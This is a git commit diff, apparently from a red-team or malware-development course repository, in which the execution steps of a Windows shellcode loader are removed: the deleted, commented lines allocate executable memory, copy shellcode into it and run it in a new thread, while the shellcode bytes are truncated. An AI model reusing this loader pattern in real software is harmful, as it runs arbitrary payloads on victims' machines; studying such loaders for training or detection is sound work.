2d2c43d361e9aaae9c4985e611419f6af1365772
VirtualAllocEx <50073731+VirtualAlllocEx@users.noreply.github.com>
2023-08-05 13:40:29 +0200

    Update Win32API-Loader.c

--- 01-Chapter_1_POC/Win32API-Loader/Win32API-Loader/Win32API-Loader.c
+++ 01-Chapter_1_POC/Win32API-Loader/Win32API-Loader/Win32API-Loader.c
@@ -18,22 +18,7 @@ int main() {
     unsigned char code[] = "\xfc\x48\x83...";
 
 
-    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
-    // 'exec' will hold the base address of the allocated memory region
-    void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-
-    // Copy the shellcode into the allocated memory region using WriteProcessMemory
-    SIZE_T bytesWritten;
-    WriteProcessMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);
-
-    // Create a new thread to execute the shellcode
-    // Pass the address of the ExecuteShellcode function as the thread function, and 'exec' as its parameter
-    // The returned handle of the created thread is stored in hThread
-    HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, exec, 0, NULL);
-
-    // Wait for the shellcode execution thread to finish executing
-    // This ensures the main thread doesn't exit before the shellcode has finished running
-    WaitForSingleObject(hThread, INFINITE);
+   
 
     // Return 0 as the main function exit code
     return 0;
